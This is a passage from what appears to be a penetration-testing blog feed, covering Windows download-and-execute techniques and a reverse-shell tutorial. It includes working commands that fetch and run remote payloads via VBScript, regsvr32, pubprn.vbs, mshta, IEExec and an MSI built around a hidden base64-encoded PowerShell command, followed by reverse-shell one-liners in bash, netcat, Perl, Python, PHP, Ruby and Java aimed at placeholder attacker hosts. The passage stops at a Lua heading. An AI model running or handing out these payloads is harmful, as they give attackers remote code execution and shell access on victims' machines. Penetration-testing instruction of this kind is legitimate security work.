class="number">13056</span></span><br><span class="line">http.open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;</span>,<span class="literal">False</span></span><br><span class="line">http.send</span><br><span class="line"><span class="keyword">Set</span> ado = createobject(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">ado.Type = adTypeBinary</span><br><span class="line">ado.Open</span><br><span class="line">ado.Write http.responseBody</span><br><span class="line">ado.SaveToFile <span class="string">&quot;c:\download\a.exe&quot;</span></span><br><span class="line">ado.Close</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; using WinHttp.WinHttpRequest.5.1</span></span><br><span class="line"><span class="keyword">Const</span> adTypeBinary = <span class="number">1</span></span><br><span class="line"><span class="keyword">Const</span> adSaveCreateOverWrite = <span class="number">2</span></span><br><span class="line"><span class="keyword">Dim</span> http,ado</span><br><span class="line"><span class="keyword">Set</span> http = CreateObject(<span class="string">&quot;WinHttp.WinHttpRequest.5.1&quot;</span>)</span><br><span class="line">http.open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;https://github.com/3gstudent/test/raw/master/putty.exe&quot;</span>,<span class="literal">False</span></span><br><span class="line">http.send</span><br><span class="line"><span class="keyword">Set</span> ado = createobject(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">ado.Type = adTypeBinary</span><br><span class="line">ado.Open</span><br><span class="line">ado.Write http.responseBody</span><br><span class="line">ado.SaveToFile <span class="string">&quot;c:\download\a.exe&quot;</span></span><br><span class="line">ado.Close</span><br></pre></td></tr></table></figure>
  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># VBScript execute by:</span></span><br><span class="line">&gt; WScript.CreateObject(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;c:\download\a.exe&quot;</span>,<span class="number">0</span>,true</span><br><span class="line"><span class="comment"># sct file format can refer to:</span></span><br><span class="line">https://raw.githubusercontent.com/<span class="number">3</span>gstudent/SCTPersistence/master/calc.sct</span><br><span class="line"><span class="comment"># and the final payload</span></span><br><span class="line">&gt; regsvr32 /u /s /i:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec2.sct scrobj.dll</span><br></pre></td></tr></table></figure></li>
<li>pubprn.vbs<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Route: regsvr32 -&gt; VBScript -&gt; download&amp;exec</span></span><br><span class="line">&gt; cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh<span class="literal">-CN</span>\pubprn.vbs <span class="number">127.0</span>.<span class="number">0.1</span> script:https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/downloadexec3.sct</span><br><span class="line"><span class="comment"># Route: regsvr32 -&gt; JScript -&gt; powershell -&gt; download&amp;exec</span></span><br></pre></td></tr></table></figure></li>
<li>msiexec<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># First, encode powershell command by using:</span></span><br><span class="line"><span class="variable">$fileContent</span> = <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;https://github.com/3gstudent/test/raw/master/putty.exe&#x27;,&#x27;c:\download\a.exe&#x27;);start-process &#x27;c:\download\a.exe&#x27;&quot;</span></span><br><span class="line"><span class="variable">$bytes</span>  = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$fileContent</span>);</span><br><span class="line"><span class="variable">$encoded</span> = [<span class="type">System.Convert</span>]::ToBase64String(<span class="variable">$bytes</span>); </span><br><span class="line"><span class="variable">$encoded</span></span><br><span class="line"><span class="comment"># get</span></span><br><span class="line">KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</span><br><span class="line"><span class="comment"># so we can execute by:</span></span><br><span class="line">&gt; powershell <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-enc</span> KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</span><br><span class="line"><span class="comment"># Second, fill it into a `wix` file:</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Wix</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/wix/2006/wi&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Product</span> <span class="attr">Id</span>=<span class="string">&quot;*&quot;</span> <span class="attr">UpgradeCode</span>=<span class="string">&quot;12345678-1234-1234-1234-111111111111&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example Product </span></span></span><br><span class="line"><span class="string"><span class="tag">Name&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;0.0.1&quot;</span> <span class="attr">Manufacturer</span>=<span class="string">&quot;@_xpn_&quot;</span> <span class="attr">Language</span>=<span class="string">&quot;1033&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Package</span> <span class="attr">InstallerVersion</span>=<span class="string">&quot;200&quot;</span> <span class="attr">Compressed</span>=<span class="string">&quot;yes&quot;</span> <span class="attr">Comments</span>=<span class="string">&quot;Windows Installer Package&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Media</span> <span class="attr">Id</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;TARGETDIR&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;SourceDir&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;ProgramFilesFolder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Directory</span> <span class="attr">Id</span>=<span class="string">&quot;INSTALLLOCATION&quot;</span> <span class="attr">Name</span>=<span class="string">&quot;Example&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">Component</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span> <span class="attr">Guid</span>=<span class="string">&quot;12345678-1234-1234-1234-222222222222&quot;</span>&gt;</span>     </span><br><span class="line">          <span class="tag">&lt;/<span class="name">Component</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Feature</span> <span class="attr">Id</span>=<span class="string">&quot;DefaultFeature&quot;</span> <span class="attr">Level</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ComponentRef</span> <span class="attr">Id</span>=<span class="string">&quot;ApplicationFiles&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Feature</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Property</span> <span class="attr">Id</span>=<span class="string">&quot;cmdline&quot;</span>&gt;</span>powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</span><br><span class="line">    <span class="tag">&lt;/<span class="name">Property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Directory</span>=<span class="string">&quot;TARGETDIR&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">ExeCommand</span>=<span class="string">&#x27;[cmdline]&#x27;</span> <span class="attr">Return</span>=<span class="string">&quot;ignore&quot;</span> <span class="attr">Impersonate</span>=<span class="string">&quot;no&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">CustomAction</span> <span class="attr">Id</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Execute</span>=<span class="string">&quot;deferred&quot;</span> <span class="attr">Script</span>=<span class="string">&quot;vbscript&quot;</span> <span class="attr">Return</span>=<span class="string">&quot;check&quot;</span>&gt;</span></span><br><span class="line">      invalid vbs to fail install</span><br><span class="line">    <span class="tag">&lt;/<span class="name">CustomAction</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;SystemShell&quot;</span> <span class="attr">After</span>=<span class="string">&quot;InstallInitialize&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Custom</span> <span class="attr">Action</span>=<span class="string">&quot;FailInstall&quot;</span> <span class="attr">Before</span>=<span class="string">&quot;InstallFiles&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Custom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">InstallExecuteSequence</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Product</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Wix</span>&gt;</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Then compile it to `msi`</span></span><br><span class="line">&gt; candle.exe msigen.wix</span><br><span class="line">&gt; light.exe msigen.wixobj</span><br><span class="line"><span class="comment"># Finally achieve our target</span></span><br><span class="line">&gt; msiexec /q /i https://github.com/<span class="number">3</span>gstudent/test/raw/master/test.msi</span><br></pre></td></tr></table></figure></li>
<li>mshta<br><code>mshta</code> supports <code>http</code> &amp; <code>https</code>, parses <code>hta</code> scripts according to respones headers.<br>Only when receiving <code>html</code> header will <code>mshta</code> executes <code>hta</code> scripts. We will receive header as <code>text/plain</code> if:<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; mshta https://raw.githubusercontent.com/<span class="number">3</span>gstudent/test/master/calc.hta</span><br></pre></td></tr></table></figure>
  That’s because github codes are regarded as <code>text</code>, and it won’t execute. To regard it as <code>html</code>, try to upload it to github pages and:  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; mshta https://<span class="number">3</span>gstudent.github.io/test/calc.hta</span><br></pre></td></tr></table></figure>
  To achieve download and execution:  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># using vbs, but have to add https://3gstudent.github.io/ to trusted sites</span></span><br><span class="line">&gt; mshta https://<span class="number">3</span>gstudent.github.io/test/downloadexec.hta</span><br><span class="line"><span class="comment"># using powershell</span></span><br><span class="line">&gt; mshta https://<span class="number">3</span>gstudent.github.io/test/downloadexec2.hta</span><br><span class="line"><span class="comment"># to make it short</span></span><br><span class="line">&gt; mshta http://t.cn/RYUQyF8</span><br></pre></td></tr></table></figure></li>
<li>IEExec<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">cd</span> C:\Windows\Microsoft.NET\Framework\v2.<span class="number">0.50727</span>\</span><br><span class="line">&gt; caspol <span class="literal">-s</span> off</span><br><span class="line">&gt; IEExec http://github.com/<span class="number">3</span>gstudent/test/raw/master/putty.exe</span><br><span class="line"><span class="comment"># while the exe format should be special, refer to</span></span><br><span class="line">https://room362.com/post/<span class="number">2014</span>/<span class="number">2014</span><span class="literal">-01</span><span class="literal">-16</span><span class="literal">-application</span><span class="literal">-whitelist</span><span class="literal">-bypass</span><span class="literal">-using</span><span class="literal">-ieexec</span><span class="literal">-dot</span><span class="literal">-exe</span>/</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Pentest-framework"><a href="#Pentest-framework" class="headerlink" title="Pentest framework"></a>Pentest framework</h2><ul>
<li>Metasploit Framework (<a href="/2020/03/17/2020-03-17-MSF-Pentest-Route/">MSF-Pentest-Route</a>)</li>
<li>Cobalt Strike</li>
<li>Empire</li>
<li>NiShang</li>
<li>Powersploit</li>
<li>Immunity Canvas</li>
</ul>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>pentest</tag>
        <tag>domain</tag>
      </tags>
  </entry>
  <entry>
    <title>About Reverse Shell</title>
    <url>/2020/03/31/2020-03-31-About-Reverse-Shell/</url>
    <content><![CDATA[<p>Reverse Shell is normal used for its advantages in avoiding being detected.<br>Attacker’s machine (which has a public IP and is reachable over the internet) acts as a server. It opens a communication channel on a port and waits for incoming connections.<br>Victim’s machine acts as a client and initiates a connection to the attacker’s listening server.</p>
<h2 id="Linux-Reverse-Shell"><a href="#Linux-Reverse-Shell" class="headerlink" title="Linux Reverse Shell"></a>Linux Reverse Shell</h2><p>On Linux we use <code>/bin/bash</code>, <code>/bin/sh</code> and some other shell terminals, and to get a reverse shell is often so easy that people often builds streamlined commands.<br>But before we use them, it’s better to go deeper and learn things about file descriptor and redirection.</p>
<h3 id="File-Descriptor"><a href="#File-Descriptor" class="headerlink" title="File Descriptor"></a>File Descriptor</h3><p>When Linux boots up, it will open three file descriptors by default:</p>
<ul>
<li>standard input :0      (keyboard as default)</li>
<li>standard output :1     (pc monitor as default)</li>
<li>error output :2        (pc monitor as default)</li>
</ul>
<p>As everything is file on Linux, even devices. so devices i&#x2F;o are controlled by file descriptors.<br>At first, binding relations are in below</p>
<ul>
<li>stdin 0   -&gt;  <code>/dev/tty0</code></li>
<li>stdout 1  -&gt;  <code>/dev/tty0</code></li>
<li>stderr 2  -&gt;  <code>/dev/tty0</code></li>
</ul>
<p>If we want to disable display of input on monitor, or input to other devices or files, we need redirection.</p>
<h3 id="Redirection"><a href="#Redirection" class="headerlink" title="Redirection"></a>Redirection</h3><p>Input redirection: <code>&lt;</code> <code>&lt;&lt;</code>     (redirect 0)<br>Output redirection: <code>&gt;</code> <code>&gt;&gt;</code>    (redirect 1)<br><code>&lt;</code> and <code>&gt;</code> are just redirection, <code>&lt;&lt;</code> and <code>&gt;&gt;</code> are appending content.</p>
<p>Before executing a command, bash process redirection symbols first.<br>Bash redirect file descriptor first, then delete redirection symbols.</p>
<p><strong>Input redirection example</strong>: <code>[n]&lt; word</code><br>If <code>n</code> is omitted (<code>&lt; word</code>), that is 0 (standard input) by default (same as <code>0&lt; word</code>).<br>Which means the content of <code>word</code> is replacing <code>stdin</code> to be the input.<br>Yon can see effects only if a program receive <code>stdin</code> to interactive.</p>
<ul>
<li>stdin 0   -&gt;  <code>word(file, device, ...)</code></li>
<li>stdout 1  -&gt;  <code>/dev/tty0</code></li>
<li>stderr 2  -&gt;  <code>/dev/tty0</code></li>
</ul>
<p><strong>Output redirection example</strong>: <code>[n]&gt; word</code><br>If <code>n</code> is omitted (<code>&gt; word</code>), that is 1 (standard input) by default (same as <code>1&gt; word</code>).<br>Which means the output will be transferred to the <code>word</code>, whatever it is a file or a device, rather than display on <code>stdout</code>.</p>
<ul>
<li>stdin 0   -&gt;  <code>/dev/tty0</code></li>
<li>stdout 1  -&gt;  <code>word(file, device, ...)</code></li>
<li>stderr 2  -&gt;  <code>/dev/tty0</code></li>
</ul>
<p><code>echo &quot;str&quot; &gt; file.txt</code> is to wipe file.txt, then add content.<br><code>echo &quot;str&quot; &gt;&gt; file.txt</code> is to append string to older content.</p>
<p><strong><code>stdin</code> and <code>stderr</code> redirection</strong>: <code>&amp;&gt; word</code> or <code>&gt;&amp; word</code><br>Both of them redirect <code>stdin</code> and <code>stderr</code> to <code>word</code>.<br>Now the situation is</p>
<ul>
<li>stdin 0   -&gt;  <code>/dev/tty0</code></li>
<li>stdout 1  -&gt;  <code>word(file, device, ...)</code></li>
<li>stderr 2  -&gt;  <code>word(file, device, ...)</code></li>
</ul>
<p>Actually they are the same with <code>&gt; word 2&gt;&amp;1</code>, then we talk about how <code>2&gt;&amp;1</code> works here.</p>
<p><strong>Copy of file descriptor</strong>:  <code>[n]&lt;&amp;[m]</code> &#x2F; <code>[n]&gt;&amp;[m]</code><br>Both of them copy <code>n</code> file descriptor to <code>m</code>, the difference is, <code>[n]&lt;&amp;[m]</code> open as read only, <code>[n]&gt;&amp;[m]</code> open in write mode.<br><code>0&lt;&amp;1</code> and <code>0&gt;&amp;1</code> works the same, because it has nothing to do with read or write mode.</p>
<p>So the <code>&amp;</code> here is to distinguish files (named as number) and file descriptors.</p>
<p><strong>Read and write mode</strong>:<br>You may notice that the file descriptor at the arrow side of the <code>&lt;</code> and <code>&gt;</code> opened as writable, so we use <code>[n]&lt;&gt;word</code> to bind <code>n</code> with <code>word</code>.<br>Now what we do to <code>n</code> also works on <code>word</code>.</p>
<p><strong>Binding redirection</strong>:  <code>exec [n] &lt;/&gt; file/[n]</code><br>Above mentioned only work for that command, use <code>exec</code> to make it effect all the time.</p>
<h3 id="Cases"><a href="#Cases" class="headerlink" title="Cases"></a>Cases</h3><p>On attacker pc we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc -lvp port</span><br><span class="line">listening on [any] port ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Then on victim pc we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/attack_ip/port 0&gt;&amp;1 </span><br></pre></td></tr></table></figure>
<p>After that attacker receive the shell</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc -lvp port</span><br><span class="line">listening on [any] 23333 ...</span><br><span class="line">connect to [attacker_ip] from (UNKNOWN) [victim_ip] xxxpid</span><br><span class="line">victim@host:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Notes:<br><code>bash -i</code> here spawns an interactive shell.<br><code>/dev/tcp/ip/port</code> is a device, you can interact with it to build <code>socket</code>.<br><code>&gt;&amp;</code> is to redirect all output to attacker pc.<br><code>0&gt;&amp;1</code>is to receive commands from attacker and then echo the result.<br>so it can be also written as </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ bash -i &gt; /dev/tcp/attack_ip/port 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><strong>Another Method</strong>: </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/attack_ip/port &lt;&amp;2</span><br></pre></td></tr></table></figure>
<p>which is </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/attack_ip/port 0&lt;&amp;2</span><br></pre></td></tr></table></figure>
<p>The situation is</p>
<ul>
<li>stdin 0   -&gt;  <code>/dev/tcp/attack_ip/port</code></li>
<li>stdout 1  -&gt;  <code>/dev/tcp/attack_ip/port</code></li>
<li>stderr 2  -&gt;  <code>/dev/tcp/attack_ip/port</code></li>
</ul>
<p><strong>One More</strong>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/attack_ip/port;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p><code>exec 5&lt;&gt;/dev/tcp/attack_ip/port</code> let us operate file descriptor 5 as if interacting with the <code>socket</code></p>
<p><code>command|while read line do .....done</code> comes from </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    ......</span><br><span class="line"><span class="keyword">done</span> &lt; file</span><br></pre></td></tr></table></figure>
<p>which is read contents from the file. Now we read from file descriptor 5, tht is the <code>socket</code>.</p>
<p>And the one below is similar</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ 0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attacker_ip/port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>

<h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p>Netcat aka <code>nc</code>, is called the Swiss Army Knife in network utilities. It can be used like <code>telnet</code> to communicate, or a <code>ftp</code> server to transfer files.<br>It can also help you get a reverse shell.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc -e /bin/sh attacker_ip port</span><br></pre></td></tr></table></figure>
<p><code>-e /bin/sh</code> means execute a shell and send it to remote.<br>Some version doesn’t have this option, so we do</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attacker_ip port &gt;/tmp/f</span><br></pre></td></tr></table></figure>
<p><code>mkfifo</code> is making a pipe to communicate.</p>
<p>A similar method</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ mknod backpipe p; nc attacker_ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>
<p>Another usage</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc attacker_ip port1|/bin/sh|nc attacker_ip port2</span><br></pre></td></tr></table></figure>
<p>It requires attacker to listen two ports, type commands to port1, then see result from port2.</p>
<h2 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h2><p>Execute</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ perl -e <span class="string">&#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;ip:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>The effective perl codes are</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line">$i=<span class="string">&quot;ip&quot;</span>;</span><br><span class="line">$p=port;    <span class="comment"># port is integer type</span></span><br><span class="line"><span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">&quot;tcp&quot;</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))&#123;</span><br><span class="line">    <span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line">    <span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line">    <span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);</span><br><span class="line">    <span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>and </p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$p=<span class="keyword">fork</span>;</span><br><span class="line"><span class="keyword">exit</span>,<span class="keyword">if</span>($p);</span><br><span class="line">$c=new IO::Socket::INET(PeerAddr,<span class="string">&quot;ip:port&quot;</span>);</span><br><span class="line">STDIN-&gt;fdopen($c,r);</span><br><span class="line">$~-&gt;fdopen($c,w);</span><br><span class="line"><span class="keyword">system</span>$_ <span class="keyword">while</span>&lt;&gt;;</span><br></pre></td></tr></table></figure>

<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>Execute in shell</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<p>The python codes are</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;ip&quot;</span>,port))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>Execute in shell</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ php -r <span class="string">&#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
<p>The PHP source are</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sock</span>=fsockopen(<span class="string">&quot;ip&quot;</span>,port);</span><br><span class="line">exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><p>Execute in shell</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;ip&quot;,port).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>The ruby source are</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">f=TCPSocket.open(<span class="string">&quot;ip&quot;</span>,port).to_i</span><br><span class="line">exec sprintf(<span class="string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)</span><br></pre></td></tr></table></figure>
<p>Remember to load lib in opinion.</p>
<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>Java use <code>Runtime</code> class to execute. </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
<h2 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h2><p>Execute in shell</p>
